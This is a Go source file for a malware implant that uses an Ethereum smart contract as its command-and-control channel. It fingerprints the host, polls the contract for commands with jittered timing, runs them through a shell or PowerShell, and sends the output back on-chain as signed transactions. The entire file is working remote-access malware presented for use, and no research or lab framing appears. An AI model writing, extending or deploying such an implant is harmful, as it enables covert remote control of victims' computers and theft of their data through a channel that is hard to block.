// Command client is the implant that runs on target systems. It polls the
// blockchain for commands, executes them, and submits results.
package main

import (
	"bytes"
	"fmt"
	"math/big"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"os/user"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/ethereum/go-ethereum"
	"github.com/ethereum/go-ethereum/accounts/abi"
	"github.com/ethereum/go-ethereum/accounts/abi/bind"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/ethclient"
)

// ──────────────────────────────────────────────
//  Embedded ABI (same as server)
// ──────────────────────────────────────────────

const contractABIJSON = `[
	{"inputs":[{"internalType":"address","name":"initialOperator","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},
	{"anonymous":false,"inputs":[{"indexed":true,"internalType":"bytes32","name":"implantId","type":"bytes32"},{"indexed":true,"internalType":"bytes32","name":"commandId","type":"bytes32"},{"indexed":false,"internalType":"string","name":"command","type":"string"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"CommandIssued","type":"event"},
	{"anonymous":false,"inputs":[{"indexed":true,"internalType":"bytes32","name":"implantId","type":"bytes32"},{"indexed":true,"internalType":"bytes32","name":"commandId","type":"bytes32"},{"indexed":true,"internalType":"bytes32","name":"resultId","type":"bytes32"},{"indexed":false,"internalType":"string","name":"result","type":"string"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"ResultSubmitted","type":"event"},
	{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"active","type":"bool"}],"name":"OperatorUpdated","type":"event"},
	{"inputs":[{"internalType":"bytes32","name":"implantId","type":"bytes32"},{"internalType":"bytes32","name":"commandId","type":"bytes32"}],"name":"ackCommand","outputs":[],"stateMutability":"nonpayable","type":"function"},
	{"inputs":[{"internalType":"bytes32","name":"","type":"bytes32"},{"internalType":"bytes32","name":"","type":"bytes32"}],"name":"commands","outputs":[{"internalType":"string","name":"data","type":"string"},{"internalType":"bool","name":"active","type":"bool"}],"stateMutability":"view","type":"function"},
	{"inputs":[{"internalType":"bytes32","name":"implantId","type":"bytes32"}],"name":"getActiveCommands","outputs":[{"internalType":"bytes32[]","name":"","type":"bytes32[]"}],"stateMutability":"view","type":"function"},
	{"inputs":[{"internalType":"bytes32","name":"implantId","type":"bytes32"},{"internalType":"bytes32","name":"commandId","type":"bytes32"}],"name":"getCommand","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
	{"inputs":[{"internalType":"bytes32","name":"implantId","type":"bytes32"}],"name":"getLatestCommand","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
	{"inputs":[{"internalType":"bytes32","name":"resultId","type":"bytes32"}],"name":"getResult","outputs":[{"internalType":"string","name":"data","type":"string"},{"internalType":"uint256","name":"timestamp","type":"uint256"},{"internalType":"bytes32","name":"commandId","type":"bytes32"}],"stateMutability":"view","type":"function"},
	{"inputs":[{"internalType":"bytes32","name":"implantId","type":"bytes32"},{"internalType":"string","name":"command","type":"string"}],"name":"issueCommand","outputs":[],"stateMutability":"nonpayable","type":"function"},
	{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"operators","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
	{"inputs":[],"name":"resultCount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
	{"inputs":[{"internalType":"uint256","name":"idx","type":"uint256"}],"name":"resultIdAtIndex","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},
	{"inputs":[{"internalType":"address","name":"op","type":"address"},{"internalType":"bool","name":"active","type":"bool"}],"name":"setOperator","outputs":[],"stateMutability":"nonpayable","type":"function"},
	{"inputs":[{"internalType":"bytes32","name":"implantId","type":"bytes32"},{"internalType":"bytes32","name":"commandId","type":"bytes32"},{"internalType":"string","name":"result","type":"string"}],"name":"submitResult","outputs":[],"stateMutability":"nonpayable","type":"function"}
]`

// ──────────────────────────────────────────────
//  Defaults
// ──────────────────────────────────────────────

const (
	defaultPollInterval = 15          // seconds
	defaultJitter       = 5           // seconds
	defaultExecTimeout  = 60          // seconds per command
)

// ──────────────────────────────────────────────
//  Main
// ──────────────────────────────────────────────

func main() {
	rpcURL := os.Getenv("ETH_RPC_URL")
	contractAddrStr := os.Getenv("CONTRACT_ADDR")
	pkHex := os.Getenv("PRIVATE_KEY")

	pollInterval := defaultPollInterval
	jitter := defaultJitter

	// CLI args override env
	args := os.Args[1:]
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--rpc":
			if i+1 < len(args) {
				i++
				rpcURL = args[i]
			}
		case "--contract":
			if i+1 < len(args) {
				i++
				contractAddrStr = args[i]
			}
		case "--key":
			if i+1 < len(args) {
				i++
				pkHex = args[i]
			}
		case "--interval":
			if i+1 < len(args) {
				i++
				fmt.Sscanf(args[i], "%d", &pollInterval)
			}
		case "--jitter":
			if i+1 < len(args) {
				i++
				fmt.Sscanf(args[i], "%d", &jitter)
			}
		case "--help", "-h":
			printHelp()
			return
		}
	}

	if rpcURL == "" || contractAddrStr == "" || pkHex == "" {
		fmt.Fprintln(os.Stderr, "Missing required config. Set ETH_RPC_URL, CONTRACT_ADDR, PRIVATE_KEY, or use --rpc, --contract, --key.")
		printHelp()
		os.Exit(1)
	}

	contractAddr := common.HexToAddress(contractAddrStr)

	// Derive implant ID from something unique but reproducible
	implantID := deriveImplantID()

	fmt.Printf("[+] C2 Blockchain Implant\n")
	fmt.Printf("    Implant ID:  0x%x\n", implantID)
	fmt.Printf("    RPC:         %s\n", rpcURL)
	fmt.Printf("    Contract:    %s\n", contractAddr.Hex())
	fmt.Printf("    Poll:        %ds ±%ds\n", pollInterval, jitter)
	fmt.Println()

	client, err := ethclient.Dial(rpcURL)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] RPC dial error: %v\n", err)
		os.Exit(1)
	}

	parsedABI, err := abi.JSON(strings.NewReader(contractABIJSON))
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] ABI parse error: %v\n", err)
		os.Exit(1)
	}

	privateKey, err := crypto.HexToECDSA(strings.TrimPrefix(pkHex, "0x"))
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Private key error: %v\n", err)
		os.Exit(1)
	}

	chainID, err := client.NetworkID(nil)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Chain ID error: %v\n", err)
		os.Exit(1)
	}
	auth, err := bind.NewKeyedTransactorWithChainID(privateKey, chainID)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Transactor error: %v\n", err)
		os.Exit(1)
	}

	// Track seen command IDs to avoid re-execution
	seen := make(map[[32]byte]bool)

	// Handle graceful shutdown
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	fmt.Println("[*] Listening for commands (Ctrl+C to stop)...")

	for {
		select {
		case <-sigCh:
			fmt.Println("\n[*] Shutting down.")
			return
		default:
		}

		err := pollCommands(client, parsedABI, contractAddr, implantID, auth, seen)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Poll error: %v\n", err)
		}

		// Jittered sleep
		sleep := pollInterval
		if jitter > 0 {
			sleep += int(randInt64n(int64(jitter*2+1))) - jitter
		}
		if sleep < 1 {
			sleep = 1
		}
		time.Sleep(time.Duration(sleep) * time.Second)
	}
}

func printHelp() {
	fmt.Println(`Usage: client [flags]

Flags:
  --rpc <url>        Ethereum RPC URL (or ETH_RPC_URL)
  --contract <addr>  Contract address (or CONTRACT_ADDR)
  --key <hex>        Private key for result submission (or PRIVATE_KEY)
  --interval <sec>   Poll interval in seconds (default 15)
  --jitter <sec>     Jitter range in seconds (default 5)
  --help, -h         Show this help

The implant polls the contract for commands, executes them, and submits results.
Read operations are free (no gas). Submitting results requires a wallet with gas.`)
}

// ──────────────────────────────────────────────
//  Implant ID derivation
// ──────────────────────────────────────────────

func deriveImplantID() [32]byte {
	hostname, _ := os.Hostname()
	u, _ := user.Current()
	mac := getMAC()

	raw := fmt.Sprintf("%s|%s|%s|%d", hostname, u.Username, mac, runtime.GOARCH)
	hash := crypto.Keccak256Hash([]byte(raw))
	var id [32]byte
	copy(id[:], hash.Bytes())
	return id
}

// ──────────────────────────────────────────────
//  Poll & Execute
// ──────────────────────────────────────────────

func pollCommands(
	client *ethclient.Client,
	parsedABI abi.ABI,
	contractAddr common.Address,
	implantID [32]byte,
	auth *bind.TransactOpts,
	seen map[[32]byte]bool,
) error {
	// Method 1: getActiveCommands (view, free)
	cmdIDs := getActiveCommandIDs(client, parsedABI, contractAddr, implantID)
	if len(cmdIDs) == 0 {
		return nil
	}

	for _, cmdID := range cmdIDs {
		if seen[cmdID] {
			continue
		}

		// getCommand (view, free)
		cmdStr, err := getCommandStr(client, parsedABI, contractAddr, implantID, cmdID)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] getCommand error: %v\n", err)
			continue
		}
		if cmdStr == "" {
			continue
		}

		fmt.Printf("[!] Executing command: %s\n", cmdStr)
		output, err := executeCommand(cmdStr)
		if err != nil {
			output = fmt.Sprintf("ERROR: %v\n%s", err, output)
		}
		fmt.Printf("[+] Output (%d bytes)\n", len(output))

		// Submit result (needs gas)
		txHash, err := submitResult(client, parsedABI, contractAddr, auth, implantID, cmdID, output)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] submitResult error: %v\n", err)
			continue
		}
		fmt.Printf("[+] Result submitted: %s\n", txHash.Hash().Hex())

		seen[cmdID] = true
	}

	return nil
}

// ──────────────────────────────────────────────
//  Blockchain interaction helpers
// ──────────────────────────────────────────────

func getActiveCommandIDs(client *ethclient.Client, parsedABI abi.ABI, contractAddr common.Address, implantID [32]byte) [][32]byte {
	data, err := parsedABI.Pack("getActiveCommands", implantID)
	if err != nil {
		return nil
	}

	resp, err := client.CallContract(nil, ethereum.CallMsg{To: &contractAddr, Data: data}, nil)
	if err != nil {
		return nil
	}

	// Unpack the dynamic array
	var ids [][32]byte
	if err := parsedABI.UnpackIntoInterface(&ids, "getActiveCommands", resp); err != nil {
		return nil
	}
	return ids
}

func getCommandStr(client *ethclient.Client, parsedABI abi.ABI, contractAddr common.Address, implantID, cmdID [32]byte) (string, error) {
	data, err := parsedABI.Pack("getCommand", implantID, cmdID)
	if err != nil {
		return "", err
	}

	resp, err := client.CallContract(nil, ethereum.CallMsg{To: &contractAddr, Data: data}, nil)
	if err != nil {
		return "", err
	}

	var cmdStr string
	if err := parsedABI.UnpackIntoInterface(&cmdStr, "getCommand", resp); err != nil {
		return "", err
	}
	return cmdStr, nil
}

func submitResult(
	client *ethclient.Client,
	parsedABI abi.ABI,
	contractAddr common.Address,
	auth *bind.TransactOpts,
	implantID, cmdID [32]byte,
	result string,
) (*types.Transaction, error) {
	data, err := parsedABI.Pack("submitResult", implantID, cmdID, result)
	if err != nil {
		return nil, fmt.Errorf("pack: %w", err)
	}

	gasPrice, err := client.SuggestGasPrice(nil)
	if err != nil {
		return nil, fmt.Errorf("gasPrice: %w", err)
	}
	// Buffer
	gasPrice = new(big.Int).Mul(gasPrice, big.NewInt(12))
	gasPrice = new(big.Int).Div(gasPrice, big.NewInt(10))

	nonce, err := client.PendingNonceAt(nil, auth.From)
	if err != nil {
		return nil, fmt.Errorf("nonce: %w", err)
	}

	tx := types.NewTransaction(nonce, contractAddr, big.NewInt(0), 200000, gasPrice, data)
	signedTx, err := auth.Signer(auth.From, tx)
	if err != nil {
		return nil, fmt.Errorf("sign: %w", err)
	}
	if err := client.SendTransaction(nil, signedTx); err != nil {
		return nil, fmt.Errorf("send: %w", err)
	}
	return signedTx, nil
}

// ──────────────────────────────────────────────
//  Command Execution
// ──────────────────────────────────────────────

func executeCommand(cmdStr string) (string, error) {
	var cmd *exec.Cmd

	// Use shell for flexibility
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("powershell.exe", "-NoProfile", "-Command", cmdStr)
	default:
		cmd = exec.Command("/bin/sh", "-c", cmdStr)
	}

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	// Timeout
	timer := time.AfterFunc(defaultExecTimeout*time.Second, func() {
		if cmd.Process != nil {
			cmd.Process.Kill()
		}
	})
	defer timer.Stop()

	err := cmd.Run()
	output := stdout.String()
	if stderr.Len() > 0 {
		if output != "" {
			output += "\n--- STDERR ---\n"
		}
		output += stderr.String()
	}

	return output, err
}

// ──────────────────────────────────────────────
//  Utility
// ──────────────────────────────────────────────

func getMAC() string {
	// Best-effort MAC address for implant identity
	ifaces, err := net.Interfaces()
	if err != nil {
		return "unknown"
	}
	for _, iface := range ifaces {
		if len(iface.HardwareAddr) > 0 && iface.Flags&net.FlagLoopback == 0 && iface.Flags&net.FlagUp != 0 {
			return iface.HardwareAddr.String()
		}
	}
	return "unknown"
}

func randInt64n(n int64) int64 {
	// Simple LCG — fine for jitter, not for crypto
	if n <= 0 {
		return 0
	}
	seed := time.Now().UnixNano()
	return (seed % n + n) % n
}
